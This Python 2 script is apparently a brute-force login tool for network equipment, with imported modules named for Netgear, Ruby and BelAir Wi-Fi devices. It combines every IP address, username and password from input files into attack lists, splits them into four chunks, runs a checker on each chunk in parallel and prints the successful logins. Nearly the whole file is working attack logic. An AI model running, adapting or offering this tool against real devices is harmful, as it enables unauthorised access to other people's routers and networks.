import module__ruby_l2
import module__netgear_l2
import module__belair_wifi
import bander_checker
import urllib
import urllib2
import random
import os
import time



#file open and list create
def file_open():
    f = open("user.txt", 'r')
    u = f.readlines()
    f.close()
    f = open("password.txt", 'r')
    p = f.readlines()
    f.close()
    f = open("result.txt", 'r')
    ip = f.readlines()
    f.close()

    ip = [ips.replace("\n","") for ips in ip]
    u = [user.replace("\n","") for user in u]
    p = [password.replace("\n","") for password in p]
#    len_ip = len(ip)
#    len_u = len(u)
#    len_p = len(p)

#    global pre
    global pre,pre_1,pre_2,pre_11,pre_12,pre_21,pre_22
    pre=[]

    for i in ip:
        for j in u:
            for k in p:
                pre.append(i +";"+ j+";" +k)



# divide attack list
    pre_1 = pre[:len(pre)/2]
    pre_11 = pre_1[:len(pre_1)/2]
    pre_12 = pre_1[len(pre_1)/2:]

    pre_2 = pre[len(pre)/2:]
    pre_21 = pre_2[:len(pre_2)/2]
    pre_22 = pre_2[len(pre_2)/2:]

    with open ("./tmp/pre_11","w") as fp:
        for line in pre_11:
            fp.write(line+"\n")
    with open ("./tmp/pre_12","w") as fp:
        for line in pre_12:
            fp.write(line+"\n")
    with open ("./tmp/pre_21","w") as fp:
        for line in pre_21:
            fp.write(line+"\n")
    with open ("./tmp/pre_22","w") as fp:
        for line in pre_22:
            fp.write(line+"\n")

#def brute(attack_list):
#    print attack_list
#    count=0
#    check_result=[]
#    for i in attack_list:
#        count +=1
#        bt_oj = i.split(';')
#        print str(bt_oj)
#        print i
#        check_result.append(bander_checker.bander_check(bt_oj[0],bt_oj[1],[bt_oj[2]]))
#        if "Login OK" in check_result:
#            print check_result
#    return check_result



def main():

    file_open()
#    print pre_1
#    print "Scanning...\n"
    os.system("cat /dev/null > ./tmp/pre")
    os.system("python multiple_checker.py tmp/pre_11 >> ./tmp/pre&")
    os.system("python multiple_checker.py tmp/pre_12 >> ./tmp/pre&")
    os.system("python multiple_checker.py tmp/pre_21 >> ./tmp/pre&")
    os.system("python multiple_checker.py tmp/pre_22 >> ./tmp/pre&")
    os.system("clear")
    time.sleep(10)
    os.system("cat ./tmp/pre | grep OK")
    print "Scanning...\n"



#    list_brute = r1


################# print result

#    print "\nLogin 'Fail' list \n ------------------------------------------"
#    for text in list_brute:
#        if "Fail" in text:
#            print text

#    print "\nLogin 'OK' list \n ------------------------------------------"
#    for text in list_brute:
#        if "OK" in text:
#            print text

if __name__ == '__main__':
    main()